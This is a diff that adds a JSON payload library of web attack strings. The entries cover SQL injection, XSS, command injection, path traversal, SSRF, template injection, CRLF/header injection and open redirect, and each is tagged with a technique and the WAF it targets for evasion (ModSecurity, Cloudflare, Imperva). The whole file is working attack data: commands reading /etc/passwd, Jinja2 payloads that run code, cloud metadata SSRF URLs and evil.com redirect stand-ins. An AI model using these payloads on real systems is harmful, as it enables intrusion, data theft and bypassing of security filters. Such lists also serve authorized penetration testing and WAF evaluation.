@@ -1,0 +1,108 @@
+{
+  "sqli": [
+    {"payload": "' OR 1=1--", "technique": "classic_tautology", "targets": ["generic"]},
+    {"payload": "' UNION SELECT NULL--", "technique": "union_based", "targets": ["generic"]},
+    {"payload": "1' AND 1=(SELECT COUNT(*) FROM tablenames); --", "technique": "subquery", "targets": ["generic"]},
+    {"payload": "' OR ''='", "technique": "string_tautology", "targets": ["generic"]},
+    {"payload": "admin'/*", "technique": "comment_truncation", "targets": ["generic"]},
+    {"payload": "%27%20OR%201%3D1--", "technique": "url_encoded", "targets": ["modsecurity"]},
+    {"payload": "' /*!50000OR*/ 1=1--", "technique": "mysql_version_comment", "targets": ["modsecurity"]},
+    {"payload": "' oR 1=1--", "technique": "case_variation", "targets": ["modsecurity"]},
+    {"payload": "' OR 1=1#", "technique": "hash_comment", "targets": ["generic"]},
+    {"payload": "';WAITFOR DELAY '0:0:5'--", "technique": "time_based_blind", "targets": ["generic"]},
+    {"payload": "' AND SLEEP(5)#", "technique": "mysql_time_blind", "targets": ["generic"]},
+    {"payload": "1;SELECT/**/1", "technique": "comment_whitespace", "targets": ["modsecurity", "cloudflare"]},
+    {"payload": "' UNION%0ASELECT%0ANULL--", "technique": "newline_bypass", "targets": ["modsecurity", "cloudflare"]},
+    {"payload": "0x27204f5220313d312d2d", "technique": "hex_encoding", "targets": ["modsecurity", "imperva"]}
+  ],
+  "xss": [
+    {"payload": "<script>alert(1)</script>", "technique": "basic_script", "targets": ["generic"]},
+    {"payload": "<img src=x onerror=alert(1)>", "technique": "event_handler", "targets": ["generic"]},
+    {"payload": "<svg/onload=alert(1)>", "technique": "svg_event", "targets": ["generic"]},
+    {"payload": "javascript:alert(1)", "technique": "protocol_handler", "targets": ["generic"]},
+    {"payload": "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>", "technique": "html_entity_encode", "targets": ["modsecurity"]},
+    {"payload": "<scr<script>ipt>alert(1)</script>", "technique": "tag_nesting", "targets": ["modsecurity"]},
+    {"payload": "<details open ontoggle=alert(1)>", "technique": "details_event", "targets": ["cloudflare"]},
+    {"payload": "<math><mtext><table><mglyph><svg><mtext><style><img src=x onerror=alert(1)>", "technique": "mathml_nesting", "targets": ["modsecurity", "cloudflare"]},
+    {"payload": "<a href=\"jAvAsCrIpT:alert(1)\">click</a>", "technique": "case_variation_protocol", "targets": ["modsecurity"]},
+    {"payload": "'-alert(1)-'", "technique": "inline_expression", "targets": ["generic"]},
+    {"payload": "<iframe srcdoc='<script>alert(1)</script>'>", "technique": "srcdoc_injection", "targets": ["cloudflare", "imperva"]},
+    {"payload": "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e", "technique": "unicode_escape", "targets": ["modsecurity", "imperva"]}
+  ],
+  "cmdi": [
+    {"payload": "; ls", "technique": "semicolon_chain", "targets": ["generic"]},
+    {"payload": "| cat /etc/passwd", "technique": "pipe", "targets": ["generic"]},
+    {"payload": "$(whoami)", "technique": "command_substitution", "targets": ["generic"]},
+    {"payload": "`id`", "technique": "backtick", "targets": ["generic"]},
+    {"payload": ";{ls,/}", "technique": "brace_expansion", "targets": ["modsecurity"]},
+    {"payload": "w$()hoami", "technique": "empty_substitution", "targets": ["modsecurity"]},
+    {"payload": "|| whoami", "technique": "or_chain", "targets": ["generic"]},
+    {"payload": "&& id", "technique": "and_chain", "targets": ["generic"]},
+    {"payload": "| cat$IFS/etc/passwd", "technique": "ifs_separator", "targets": ["modsecurity", "cloudflare"]},
+    {"payload": ";c'a't /etc/passwd", "technique": "quote_splitting", "targets": ["modsecurity"]},
+    {"payload": ";c\\at /etc/passwd", "technique": "backslash_splitting", "targets": ["modsecurity"]},
+    {"payload": "$(printf '\\x69\\x64')", "technique": "printf_hex", "targets": ["modsecurity", "imperva"]}
+  ],
+  "path_traversal": [
+    {"payload": "../../../etc/passwd", "technique": "basic_dotdot", "targets": ["generic"]},
+    {"payload": "....//....//etc/passwd", "technique": "double_encoding", "targets": ["modsecurity"]},
+    {"payload": "..%252f..%252f..%252fetc/passwd", "technique": "double_url_encode", "targets": ["modsecurity"]},
+    {"payload": "/etc/passwd%00.jpg", "technique": "null_byte", "targets": ["generic"]},
+    {"payload": "..%c0%af..%c0%afetc/passwd", "technique": "utf8_overlong", "targets": ["modsecurity", "imperva"]},
+    {"payload": "..\\..\\..\\etc\\passwd", "technique": "backslash_traversal", "targets": ["generic"]},
+    {"payload": "..%5c..%5c..%5cetc/passwd", "technique": "encoded_backslash", "targets": ["modsecurity"]},
+    {"payload": "/....\\....\\etc/passwd", "technique": "mixed_slash_dot", "targets": ["cloudflare"]}
+  ],
+  "ssrf": [
+    {"payload": "http://169.254.169.254/latest/meta-data/", "technique": "cloud_metadata", "targets": ["generic"]},
+    {"payload": "http://0x7f000001/", "technique": "hex_ip", "targets": ["modsecurity"]},
+    {"payload": "http://127.1/", "technique": "short_ip", "targets": ["modsecurity"]},
+    {"payload": "http://[::1]/", "technique": "ipv6_loopback", "targets": ["generic"]},
+    {"payload": "http://2130706433/", "technique": "decimal_ip", "targets": ["modsecurity", "cloudflare"]},
+    {"payload": "http://0177.0.0.1/", "technique": "octal_ip", "targets": ["modsecurity"]},
+    {"payload": "http://localhost:80@evil.com/", "technique": "credential_bypass", "targets": ["generic"]},
+    {"payload": "http://169.254.169.254.nip.io/", "technique": "dns_rebinding", "targets": ["cloudflare", "imperva"]},
+    {"payload": "gopher://127.0.0.1:6379/_INFO", "technique": "gopher_protocol", "targets": ["generic"]},
+    {"payload": "http://[0:0:0:0:0:ffff:127.0.0.1]/", "technique": "ipv6_mapped_ipv4", "targets": ["modsecurity", "cloudflare"]}
+  ],
+  "ssti": [
+    {"payload": "{{7*7}}", "technique": "basic_expression", "targets": ["generic"]},
+    {"payload": "${7*7}", "technique": "dollar_expression", "targets": ["generic"]},
+    {"payload": "{{config}}", "technique": "config_access", "targets": ["generic"]},
+    {"payload": "{% import os %}{{os.popen('id').read()}}", "technique": "jinja2_rce", "targets": ["generic"]},
+    {"payload": "{{''.__class__.__mro__[2].__subclasses__()}}", "technique": "jinja2_class_traversal", "targets": ["generic"]},
+    {"payload": "#{7*7}", "technique": "ruby_erb_expression", "targets": ["generic"]},
+    {"payload": "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", "technique": "jinja2_globals_chain", "targets": ["modsecurity"]},
+    {"payload": "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}", "technique": "jinja2_cycler_bypass", "targets": ["modsecurity", "cloudflare"]}
+  ],
+  "header_injection": [
+    {"payload": "value\r\nInjected-Header: malicious", "technique": "basic_crlf_header", "targets": ["generic"]},
+    {"payload": "value%0d%0aInjected-Header:%20malicious", "technique": "url_encoded_crlf", "targets": ["generic"]},
+    {"payload": "value\r\n\r\n<html>injected</html>", "technique": "response_splitting", "targets": ["generic"]},
+    {"payload": "value%0d%0aSet-Cookie:%20session=hijacked", "technique": "cookie_injection", "targets": ["generic"]},
+    {"payload": "value%E5%98%8A%E5%98%8DInjected:%20bypass", "technique": "unicode_crlf", "targets": ["modsecurity", "cloudflare"]},
+    {"payload": "value%0aX-Injected:%20header", "technique": "lf_only", "targets": ["modsecurity"]},
+    {"payload": "value%0d%20%0aInjected:%20bypass", "technique": "space_between_cr_lf", "targets": ["cloudflare", "imperva"]},
+    {"payload": "value\r\nTransfer-Encoding: chunked", "technique": "smuggling_header", "targets": ["generic"]}
+  ],
+  "open_redirect": [
+    {"payload": "//evil.com", "technique": "protocol_relative", "targets": ["generic"]},
+    {"payload": "/\\evil.com", "technique": "backslash_redirect", "targets": ["generic"]},
+    {"payload": "https://evil.com", "technique": "absolute_url", "targets": ["generic"]},
+    {"payload": "/%2f/evil.com", "technique": "encoded_slash", "targets": ["modsecurity"]},
+    {"payload": "https://trusted.com@evil.com", "technique": "credential_url", "targets": ["generic"]},
+    {"payload": "//evil%E3%80%82com", "technique": "unicode_dot", "targets": ["modsecurity", "cloudflare"]},
+    {"payload": "////evil.com", "technique": "multiple_slash", "targets": ["modsecurity"]},
+    {"payload": "https://trusted.com.evil.com", "technique": "subdomain_match", "targets": ["generic"]}
+  ],
+  "crlf": [
+    {"payload": "%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>", "technique": "response_injection", "targets": ["generic"]},
+    {"payload": "%0d%0aLocation:%20https://evil.com", "technique": "redirect_injection", "targets": ["generic"]},
+    {"payload": "%E5%98%8A%E5%98%8DContent-Type:%20text/html", "technique": "unicode_crlf", "targets": ["modsecurity", "cloudflare"]},
+    {"payload": "%0d%0aSet-Cookie:%20admin=true", "technique": "cookie_setting", "targets": ["generic"]},
+    {"payload": "\\r\\nX-Injected: true", "technique": "literal_escape_sequence", "targets": ["generic"]},
+    {"payload": "%0d%0a%0d%0a{\"injected\":true}", "technique": "body_injection", "targets": ["generic"]},
+    {"payload": "%c4%8d%c4%8aInjected:%20header", "technique": "utf8_encoded_crlf", "targets": ["cloudflare", "imperva"]},
+    {"payload": "%0d%20%0a%20Injected:%20header", "technique": "space_padded_crlf", "targets": ["modsecurity"]}
+  ]
+}
